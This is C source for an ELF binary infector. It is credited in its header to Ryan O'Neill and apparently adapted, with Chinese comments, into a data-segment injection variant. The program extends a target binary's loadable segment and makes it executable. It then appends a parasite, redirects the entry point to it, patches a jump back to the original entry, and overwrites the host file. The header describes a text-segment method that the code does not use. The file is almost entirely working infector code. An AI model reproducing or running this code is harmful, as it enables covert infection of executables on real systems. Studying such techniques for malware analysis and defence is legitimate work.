/*
 * Inject-Parasite: ELF Binary infector (C) 2008  Ryan O'Neill <ryan@bitlackeys.com>
 * This is an ELF binary infector that inserts the parasite in front of the text segment
 * and essentially extends the text segment backwards. This is a good method because the entry
 * point does not need to be modified, although a good binary integrity checker will notice
 * that the text/base address is slightly unusual.
 *
 */

/*
 *data段注入
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h> 
#include <fcntl.h>

#include <elf.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096
#define TMP "tmp.bin"
extern int return_entry_start;
struct stat st;
char *host;

unsigned long entry_point, o_shoff, bss_addr;
int ehdr_size; 

void mirror_binary_with_parasite(unsigned int, unsigned char *, char *);

int main(int argc, char **argv)
{
	unsigned char *mem; 
	
	unsigned char *tp;
	int fd, i, c;
	char data_found;
	mode_t mode;
	
	extern char parasite[];
	/* bytes of parasite */
        unsigned int parasite_size;
	unsigned long int leap_offset;
	unsigned long parasite_vaddr;

 	Elf64_Shdr *s_hdr;
        Elf64_Ehdr *e_hdr;
        Elf64_Phdr *p_hdr;
	
	usage:
	if (argc < 2)
	{
		printf("Usage: %s <elf-host>\n",argv[0]); 
		exit(-1);
	}
 	 
	host = argv[1];
	//舍弃外部参数输入，直接sizeof计算, 不可strlen,会有\x00坏字符
	parasite_size = return_entry_start + 6;
	printf("Length of parasite is %d bytes\n", parasite_size);
	
	if ((fd = open(argv[1], O_RDONLY)) == -1)
	{
		perror("open");
		exit(-1);
	}
	
	if (fstat(fd, &st) < 0)
        {
               perror("stat");
               exit(-1);
        } 
	
	mem = mmap(NULL, st.st_size,  PROT_READ | PROT_WRITE, MAP_PRIVATE , fd, 0);
	if (mem == MAP_FAILED)
	{
	       perror("mmap");
	       exit(-1);
 	}
	
	e_hdr = (Elf64_Ehdr *)mem;
	//这里条件应该为||
 	if (e_hdr->e_ident[0] != 0x7f || strncmp(&e_hdr->e_ident[1], "ELF", 3))
        {
                printf("%s it not an elf file\n", argv[1]);
                exit(-1);
        } 
	
       printf("Parasite size: %d\n", parasite_size);
       
       data_found = 0;
       unsigned int after_insertion_offset;
       ehdr_size = sizeof(*e_hdr);
       entry_point = e_hdr->e_entry; 
	   o_shoff = e_hdr->e_shoff;
       e_hdr->e_shoff += parasite_size;
       p_hdr = (Elf64_Phdr *)(mem + e_hdr->e_phoff);
       
       for (i = e_hdr->e_phnum; i-- > 0; p_hdr++) 
       {	 
           if(p_hdr->p_type == PT_LOAD)
	        if (p_hdr->p_offset != 0)
	        {
			  bss_addr = p_hdr->p_offset + p_hdr->p_filesz;
			  e_hdr->e_entry = p_hdr->p_vaddr + p_hdr->p_filesz;
			  p_hdr->p_filesz += parasite_size;
			  p_hdr->p_memsz += parasite_size;
			  data_found = 1;
			  p_hdr->p_flags |= PF_X;
	        }
        }  
	//e_hdr->e_entry += sizeof(*e_hdr);
	
	 s_hdr = (Elf64_Shdr *)(mem + o_shoff);
	for(i=0; i<e_hdr->e_shnum; i++)
	 {
		 if(s_hdr[i].sh_offset >= bss_addr)
        {
            //printf("[+] Offset of section need to edit is 0x%X\n", s_hdr[i].sh_offset);
            s_hdr[i].sh_offset += parasite_size;
        }
	 }
		
 	 
	 printf("new entry: %lx\n", e_hdr->e_entry);
	 mirror_binary_with_parasite(parasite_size, mem, parasite);

 	 done:
 	 munmap(mem, st.st_size);
 	 close(fd);
 	  	  
 }
void mirror_binary_with_parasite(unsigned int psize, unsigned char *mem, char *parasite)
{
    int ofd;
    int c;

    printf("Mirroring host binary with parasite %d bytes\n",psize);
    if((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
    {
        perror("tmp binary: open");
        goto _error;
    }
    //写入到data段结尾的数据
    if ((c = write(ofd, mem, bss_addr)) != bss_addr)
    {
        printf("failed writing ehdr\n");
        goto _error;
    }

    printf("Patching parasite to jmp to %lx\n", entry_point);
    //写入寄生代码
    *(unsigned int *)&parasite[return_entry_start] = entry_point;
    if ((c = write(ofd, parasite, psize)) != psize)
    {
        perror("writing parasite failed");
        goto _error;
    }

    mem += bss_addr;
    if ((c = write(ofd, mem, st.st_size-bss_addr)) != st.st_size-bss_addr)
    {
        printf("Failed writing binary, wrote %d bytes\n", c);
        goto _error;
    }
	rename(TMP, host);
_error:
    close(ofd);
}
